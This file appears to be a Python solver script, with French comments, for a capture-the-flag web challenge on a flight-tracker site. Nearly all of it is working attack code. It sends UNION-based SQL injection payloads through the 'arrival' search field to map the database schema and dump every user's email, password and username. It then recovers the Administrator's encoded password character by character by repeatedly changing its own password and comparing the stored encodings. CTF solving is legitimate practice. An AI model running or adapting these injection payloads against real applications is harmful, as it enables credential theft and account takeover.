import requests
from html.parser import HTMLParser
import string

base_url = 'http://removebeforeflight.chall.malicecyber.com'

'''
Exemple de réponse :

       <table class="table table-striped table-hover table-bordered align-middle">
                <thead>
                        <tr>
                                <th scope="col">Number</th>
                                <th scope="col">Departure</th>
                                <th scope="col">Arrival</th>
                                <th scope="col">Departure date</th>
                                <th scope="col">Arrival date</th>
                                <th scope="col">Airplane</th>
                        </tr>
                </thead>
                <tbody>

                        <tr>
                                <td>1</td>
                                <td>2</td>
                                <td>3</td>
                                <td>4</td>
                                <td>5</td>
                                <td>4f524d485178596f4f69494c4242315343684e61556b6848576c4a4952317053</td>
                        </tr>
                </tbody>
        </table>
'''
# Parser pour extraire uniquement le dernier <td>
class CustomHTMLParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self._last_td = ''
        self._td_in_progess = False
    
    def handle_starttag(self, tag, attrs):
        if tag == "td":
            self._td_in_progess = True

    def handle_endtag(self, tag):
        if tag == "td":
            self._td_in_progess = False

    def handle_data(self, data):
        if self._td_in_progess:
            self._last_td = data
    
    @property
    def last_td(self):
        #print(f'{self._last_td=}')
        return self._last_td


html_parser = CustomHTMLParser()


# =================================================
# Site Interactions
# =================================================
def site_register(session):
    pass

def site_login(session, user_data):
    login_url = base_url + '/login'
    response = session.post(url=login_url, data=user_data)

def site_logout(session):
    logout_url = base_url + '/logout'
    response = session.get(url=logout_url)
    
def site_search_flight(session, search_json_payload):
    search_url = base_url + '/tracker/search'
    response = session.post(url=search_url, json=search_json_payload)
    '''
    Exemple de réponse brute :
    {'Table': '\n\t<table class="table table-striped table-hover table-bordered align-middle">\n\t\t<thead>\n\t\t\t<tr>\n\t\t\t\t<th scope="col">Number</th>\n\t\t\t\t<th scope="col">Departure</th>\n\t\t\t\t<th scope="col">Arrival</th>\n\t\t\t\t<th scope="col">Departure date</th>\n\t\t\t\t<th scope="col">Arrival date</th>\n\t\t\t\t<th scope="col">Airplane</th>\n\t\t\t</tr>\n\t\t</thead>\n\t\t<tbody>\n\t\n\t\t\t<tr>\n\t\t\t\t<td>1</td>\n\t\t\t\t<td>2</td>\n\t\t\t\t<td>3</td>\n\t\t\t\t<td>4</td>\n\t\t\t\t<td>5</td>\n\t\t\t\t<td>4f524d485178596f4f69494c4242315343684e61556b6848576c4a4952317053</td>\n\t\t\t</tr>\n\t\t</tbody>\n\t</table>', 'Notif': {'Color': '', 'Message': ''}}
    '''
    return response.json()['Table']

def site_search_last_airplane(session, search_json_payload):
    html_response = site_search_flight(session, search_json_payload)
    html_parser.feed(html_response)
    return html_parser.last_td

def get_encoded_user_password(session, username):
    extract_admin_password_json_payload = { 
        "arrival" : f"ABC123' and 1=1 union select '1','2','3','4','5', password from users where username = '{username}' -- "
    }
    return site_search_last_airplane(session=session, search_json_payload=extract_admin_password_json_payload)

def change_password(session, old_password, new_password):
    change_password_url = base_url + '/changepassword'
    payload_data = {'old_password': old_password, 'new_password': new_password}
    session.post(url=change_password_url, data=payload_data)


# =====================
# Starting context
# =====================
username = 'tutu'
old_password = 'Adm!n~'
user_data = {'username': username, 'password': old_password}

session = requests.Session()
site_login(session, user_data)

'''
rep = site_search_flight(session, {
    #"arrival" : f"ABC123' and 1=1 union select '1','2','3','4','5', name from sqlite_schema -- "
    #"arrival" : "ABC123' and 1=1 union select '1','2','3','4','5', name from pragma_table_info('flights') -- "
    #"arrival" : "ABC123' and 1=1 union select '1','2','3','4','5', name from pragma_table_info('users') -- "
    "arrival" : "ABC123' and 1=1 union select '1','2','3','4','5', email || '|' || password || '|' || type || '|' || username from users -- "
})
print(rep)
site_logout(session)
quit()
'''

encoded_admin_password = get_encoded_user_password(session=session, username='Administrator')
#encoded_admin_password = get_encoded_user_password(session=session, username='Gold3nBoy')
print(f'{encoded_admin_password=}')

encoded_user_password = get_encoded_user_password(session=session, username=username)
print(f'{encoded_user_password=}')

decoded_admin_password = 'Adm!n_'
#decoded_admin_password = 'Adm!n_P@ssw0rd'
#decoded_admin_password = 'Doll4r$4r3C00l!'

valid_car_password = string.ascii_letters + string.digits  + string.punctuation  # + ''.join([chr(i) for i in range(161,256)]) # + string.whitespace

#decoded_admin_password = ''
for car in valid_car_password:
    candidate_admin_password = decoded_admin_password + car
    new_password = candidate_admin_password
    change_password(session, old_password, new_password)
    print(f'test : {old_password} {encoded_user_password} -> {new_password}')
    old_password = new_password
    encoded_user_password = get_encoded_user_password(session, username)
    site_logout(session)
    user_data = {'username': username, 'password': old_password}
    site_login(session, user_data)

site_logout(session)
